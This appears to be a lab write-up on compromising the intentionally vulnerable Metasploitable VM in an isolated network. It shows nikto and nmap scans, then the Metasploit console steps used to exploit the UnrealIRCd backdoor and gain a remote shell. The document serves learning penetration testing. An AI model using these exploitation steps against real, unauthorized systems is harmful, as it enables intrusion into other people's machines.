![image](https://github.com/user-attachments/assets/077df3c9-a9c5-4e5b-8d59-ae6ad2b86007)

Itâ€™s intentionally vulnerable, so exposing it to the internet is a major security risk (it could be compromised within minutes and used for attacks).

VMware:
- Go to VM Settings > Network Adapter
- Set to Host-only or Custom (VMnet1)
- This keeps it isolated to your machine.

## Vulnerability Scanning 
```
nikto -h <machine's ip>
```
![image](https://github.com/user-attachments/assets/8a3fbce8-427f-4e60-ad68-05273d298c2e)

As indicated by the results 
- Apache/2.2.8 appears to be outaded
- HTTP TRACE method is active which suggests the host is vulnerable to XST

```
nmap -A -p- [Metasploitable_IP] -oN full_scan.txt
```
-Running a full nmao scan - A(Aggressive) -p(scanning all ports) -oN( output to file)

### Exploit
I am going to exploit the UnrealRCd Backdoor Detection
- in the shell type msfconsole to start the metasploit service 

```
search unreal
```
- This was to find the payload available in metasploit for this vulnerability

Then I used 
```
search unreal
use 5
show options
set RHOSTS <ip_address>
show payloads
set payload 5
set LHOST <ip_address>
exploit 
```

I recieved an error regarding saying the exploit was completed but no session was created 
ran on KAli
```
ip a
```
Then ping both ip address from the target to see which replies and rerun explot command

So the following image show that I have accessed the target machine through the unreal backdoor vulnerability. I entered commanfd ``` ip a ``` and the response was the ip address of the target machine.
